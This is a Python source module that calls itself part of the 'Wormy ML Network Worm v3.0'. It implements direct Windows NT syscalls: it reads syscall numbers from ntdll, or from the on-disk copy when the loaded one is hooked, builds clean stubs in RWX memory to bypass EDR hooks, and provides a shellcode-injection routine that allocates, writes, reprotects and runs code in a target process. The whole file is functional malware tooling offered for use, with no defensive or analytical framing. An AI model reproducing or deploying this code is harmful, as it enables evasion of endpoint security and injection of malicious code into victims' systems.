"""
Wormy ML Network Worm v3.0 - Direct Syscalls Module
Bypass userland EDR hooks by calling NT syscalls directly via mmap'd stubs.
"""

import ctypes
import ctypes.wintypes
import mmap
import os
import platform
import struct
import sys
from typing import Dict, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


class DirectSyscalls:
    """
    Dynamic direct syscall resolution and execution for Windows x64.

    How it works:
      1. Locate each Nt* function in ntdll.dll (which EDR may have hooked).
      2. Read the 5th byte of the stub to extract the syscall number.
         (Standard stub: 4C 8B D1 | B8 XX 00 00 00 | 0F 05 | C3)
      3. Allocate RWX memory and write our own clean stub with that number.
      4. Call the stub directly — bypasses any trampoline the EDR installed.

    Implemented syscalls:
      - NtOpenProcess
      - NtAllocateVirtualMemory
      - NtWriteVirtualMemory
      - NtCreateThreadEx
      - NtProtectVirtualMemory
    """

    # x64 syscall stub template
    # 4C 8B D1       mov  r10, rcx
    # B8 XX 00 00 00 mov  eax, <SSN>
    # 0F 05          syscall
    # C3             ret
    _STUB_TEMPLATE = (
        b"\x4c\x8b\xd1"  # mov r10, rcx
        b"\xb8\x00\x00\x00\x00"  # mov eax, SSN  (bytes [3:7] are patched)
        b"\x0f\x05"  # syscall
        b"\xc3"  # ret
    )

    def __init__(self):
        self._os = platform.system()
        self._k32 = None
        self._ntdll = None
        self._stubs = {}  # name -> ctypes function ptr
        self._stub_mem = []  # keep references so memory isn't freed

        if self._os == "Windows":
            self._k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            self._ntdll = ctypes.WinDLL("ntdll.dll")
            self._resolve_all()

    # ─── resolution ──────────────────────────────────────────────────────────

    def _extract_ssn(self, func_name: str) -> Optional[int]:
        """
        Read the syscall number from an ntdll stub at byte offset 4.
        If the function is hooked (jmp at offset 0) we fall back to
        scanning the export section of the fresh on-disk ntdll for the SSN.
        """
        fn = self._k32.GetProcAddress(self._ntdll._handle, func_name.encode())
        if not fn:
            return None

        # Read 8 bytes
        buf = (ctypes.c_ubyte * 8)()
        n = ctypes.c_size_t(0)
        self._k32.ReadProcessMemory(self._k32.GetCurrentProcess(), fn, buf, 8, ctypes.byref(n))

        # Standard stub: first byte is 0x4C (mov r10,rcx)
        if buf[0] == 0x4C and buf[3] == 0xB8:
            ssn = struct.unpack_from("<I", bytes(buf), 4)[0]
            return ssn

        # Hooked — fall back to disk parsing
        return self._ssn_from_disk(func_name)

    def _ssn_from_disk(self, func_name: str) -> Optional[int]:
        """
        Parse the fresh on-disk ntdll.dll export table, find the function
        in RVA order (functions are sorted by SSN in ntdll), and return its
        positional index as the syscall number.
        """
        ntdll_path = r"C:\Windows\System32\ntdll.dll"
        try:
            with open(ntdll_path, "rb") as f:
                pe = f.read()
            exports = self._parse_exports(pe)
            # Filter Nt* syscall stubs (all start with 0x4C at their raw offset)
            nt_funcs = sorted(
                [
                    (name, rva)
                    for name, rva in exports.items()
                    if name.startswith("Nt")
                    and len(pe) > rva + 5
                    and pe[rva] == 0x4C
                    and pe[rva + 3] == 0xB8
                ],
                key=lambda x: x[1],  # sort by RVA == sorted by SSN
            )
            ssn_map = {name: i for i, (name, _) in enumerate(nt_funcs)}
            return ssn_map.get(func_name)
        except Exception as e:
            logger.debug(f"SSN disk parse failed for {func_name}: {e}")
            return None

    def _parse_exports(self, pe: bytes) -> Dict[str, int]:
        """Return {export_name: rva} for all named exports in a PE."""
        exports = {}
        try:
            e_lfanew = struct.unpack_from("<I", pe, 0x3C)[0]
            opt_off = e_lfanew + 24
            pe_magic = struct.unpack_from("<H", pe, opt_off)[0]
            data_dir_off = opt_off + (96 if pe_magic == 0x10B else 112)
            exp_rva = struct.unpack_from("<I", pe, data_dir_off)[0]
            if not exp_rva:
                return exports
            exp_raw = self._rva_to_raw(pe, exp_rva)
            if not exp_raw:
                return exports

            num_names = struct.unpack_from("<I", pe, exp_raw + 24)[0]
            names_rva = struct.unpack_from("<I", pe, exp_raw + 32)[0]
            funcs_rva = struct.unpack_from("<I", pe, exp_raw + 28)[0]
            ords_rva = struct.unpack_from("<I", pe, exp_raw + 36)[0]

            names_raw = self._rva_to_raw(pe, names_rva)
            funcs_raw = self._rva_to_raw(pe, funcs_rva)
            ords_raw = self._rva_to_raw(pe, ords_rva)

            for i in range(num_names):
                name_rva = struct.unpack_from("<I", pe, names_raw + i * 4)[0]
                name_raw = self._rva_to_raw(pe, name_rva)
                end = pe.index(b"\x00", name_raw)
                name = pe[name_raw:end].decode(errors="replace")
                ord_idx = struct.unpack_from("<H", pe, ords_raw + i * 2)[0]
                fn_rva = struct.unpack_from("<I", pe, funcs_raw + ord_idx * 4)[0]
                exports[name] = self._rva_to_raw(pe, fn_rva)
        except Exception:
            pass
        return exports

    def _rva_to_raw(self, pe: bytes, rva: int) -> int:
        """Convert RVA to file offset via section headers."""
        try:
            e_lfanew = struct.unpack_from("<I", pe, 0x3C)[0]
            num_sect = struct.unpack_from("<H", pe, e_lfanew + 6)[0]
            size_opt = struct.unpack_from("<H", pe, e_lfanew + 20)[0]
            sect_offset = e_lfanew + 24 + size_opt
            for i in range(num_sect):
                base = sect_offset + i * 40
                vsize = struct.unpack_from("<I", pe, base + 8)[0]
                vaddr = struct.unpack_from("<I", pe, base + 12)[0]
                raw_off = struct.unpack_from("<I", pe, base + 20)[0]
                if vaddr <= rva < vaddr + vsize:
                    return raw_off + (rva - vaddr)
        except Exception:
            pass
        return 0

    # ─── stub creation ───────────────────────────────────────────────────────

    def _make_stub(self, ssn: int):
        """Allocate RWX memory with a clean syscall stub for the given SSN."""
        k32 = self._k32
        stub = bytearray(self._STUB_TEMPLATE)
        struct.pack_into("<I", stub, 4, ssn)  # patch SSN into mov eax,...

        size = len(stub)
        addr = k32.VirtualAlloc(
            None, size, 0x3000, 0x40  # MEM_COMMIT|MEM_RESERVE
        )  # PAGE_EXECUTE_READWRITE
        if not addr:
            raise OSError("VirtualAlloc failed for syscall stub")

        buf = (ctypes.c_char * size).from_buffer_copy(bytes(stub))
        k32.RtlMoveMemory(addr, buf, size)
        self._stub_mem.append(buf)  # keep alive
        return addr

    def _get_stub_fn(self, name: str, restype, *argtypes):
        """Return a ctypes-callable function for the given syscall name."""
        ssn = self._extract_ssn(name)
        if ssn is None:
            logger.warning(f"Could not resolve SSN for {name}")
            return None
        addr = self._make_stub(ssn)
        ftype = ctypes.CFUNCTYPE(restype, *argtypes)
        fn = ftype(addr)
        logger.debug(f"{name}: SSN=0x{ssn:02X}, stub=0x{addr:X}")
        return fn

    def _resolve_all(self):
        """Pre-resolve all syscall stubs."""
        try:
            self._stubs["NtOpenProcess"] = self._get_stub_fn(
                "NtOpenProcess",
                ctypes.c_long,
                ctypes.POINTER(ctypes.c_void_p),  # ProcessHandle
                ctypes.c_ulong,  # DesiredAccess
                ctypes.c_void_p,  # ObjectAttributes
                ctypes.c_void_p,  # ClientId
            )
            self._stubs["NtAllocateVirtualMemory"] = self._get_stub_fn(
                "NtAllocateVirtualMemory",
                ctypes.c_long,
                ctypes.c_void_p,  # ProcessHandle
                ctypes.POINTER(ctypes.c_void_p),  # BaseAddress
                ctypes.c_ulong,  # ZeroBits
                ctypes.POINTER(ctypes.c_size_t),  # RegionSize
                ctypes.c_ulong,  # AllocationType
                ctypes.c_ulong,  # Protect
            )
            self._stubs["NtWriteVirtualMemory"] = self._get_stub_fn(
                "NtWriteVirtualMemory",
                ctypes.c_long,
                ctypes.c_void_p,  # ProcessHandle
                ctypes.c_void_p,  # BaseAddress
                ctypes.c_void_p,  # Buffer
                ctypes.c_size_t,  # NumberOfBytesToWrite
                ctypes.POINTER(ctypes.c_size_t),  # NumberOfBytesWritten
            )
            self._stubs["NtCreateThreadEx"] = self._get_stub_fn(
                "NtCreateThreadEx",
                ctypes.c_long,
                ctypes.POINTER(ctypes.c_void_p),  # ThreadHandle
                ctypes.c_ulong,  # DesiredAccess
                ctypes.c_void_p,  # ObjectAttributes
                ctypes.c_void_p,  # ProcessHandle
                ctypes.c_void_p,  # StartRoutine
                ctypes.c_void_p,  # Argument
                ctypes.c_ulong,  # CreateFlags
                ctypes.c_size_t,  # ZeroBits
                ctypes.c_size_t,  # StackSize
                ctypes.c_size_t,  # MaximumStackSize
                ctypes.c_void_p,  # AttributeList
            )
            self._stubs["NtProtectVirtualMemory"] = self._get_stub_fn(
                "NtProtectVirtualMemory",
                ctypes.c_long,
                ctypes.c_void_p,  # ProcessHandle
                ctypes.POINTER(ctypes.c_void_p),  # BaseAddress
                ctypes.POINTER(ctypes.c_size_t),  # RegionSize
                ctypes.c_ulong,  # NewProtect
                ctypes.POINTER(ctypes.c_ulong),  # OldProtect
            )
            logger.success(f"Direct syscalls resolved: {list(self._stubs.keys())}")
        except Exception as e:
            logger.error(f"Syscall resolution failed: {e}")

    # ─── public injection helper ──────────────────────────────────────────────

    def inject_shellcode(self, shellcode: bytes, target_pid: int = None) -> bool:
        """
        Inject shellcode into target_pid (or self if None) using
        direct syscalls NtAllocateVirtualMemory + NtWriteVirtualMemory
        + NtCreateThreadEx — no Win32 API calls visible to userland hooks.
        """
        if self._os != "Windows":
            return False

        k32 = self._k32
        NT_SUCCESS = lambda x: x >= 0

        try:
            if target_pid:
                proc_h = k32.OpenProcess(0x1F0FFF, False, target_pid)
            else:
                proc_h = k32.GetCurrentProcess()

            # NtAllocateVirtualMemory
            base_addr = ctypes.c_void_p(0)
            region = ctypes.c_size_t(len(shellcode))
            nt_alloc = self._stubs.get("NtAllocateVirtualMemory")
            if not nt_alloc:
                return False

            status = nt_alloc(
                proc_h,
                ctypes.byref(base_addr),
                0,
                ctypes.byref(region),
                0x3000,  # MEM_COMMIT|MEM_RESERVE
                0x04,
            )  # PAGE_READWRITE
            if not NT_SUCCESS(status):
                logger.error(f"NtAllocateVirtualMemory status: 0x{status & 0xFFFFFFFF:08X}")
                return False

            # NtWriteVirtualMemory
            buf = (ctypes.c_char * len(shellcode)).from_buffer_copy(shellcode)
            written = ctypes.c_size_t(0)
            nt_write = self._stubs.get("NtWriteVirtualMemory")
            status = nt_write(proc_h, base_addr, buf, len(shellcode), ctypes.byref(written))
            if not NT_SUCCESS(status):
                return False

            # NtProtectVirtualMemory → PAGE_EXECUTE_READ
            old_prot = ctypes.c_ulong(0)
            reg_size = ctypes.c_size_t(len(shellcode))
            base_copy = ctypes.c_void_p(base_addr.value)
            nt_prot = self._stubs.get("NtProtectVirtualMemory")
            nt_prot(
                proc_h,
                ctypes.byref(base_copy),
                ctypes.byref(reg_size),
                0x20,
                ctypes.byref(old_prot),
            )

            # NtCreateThreadEx
            thread_h = ctypes.c_void_p(0)
            nt_thread = self._stubs.get("NtCreateThreadEx")
            status = nt_thread(
                ctypes.byref(thread_h), 0x1FFFFF, None, proc_h, base_addr, None, 0, 0, 0, 0, None
            )

            if NT_SUCCESS(status) and thread_h.value:
                k32.WaitForSingleObject(thread_h, 0xFFFFFFFF)
                logger.success(
                    f"Direct syscall injection succeeded " f"(base=0x{base_addr.value:X})"
                )
                return True
            return False

        except Exception as e:
            logger.error(f"Direct syscall injection failed: {e}")
            return False

    def available(self) -> bool:
        return self._os == "Windows" and bool(self._stubs)

    def get_resolved_syscalls(self) -> Dict[str, Optional[int]]:
        return {name: self._extract_ssn(name) for name in self._stubs}
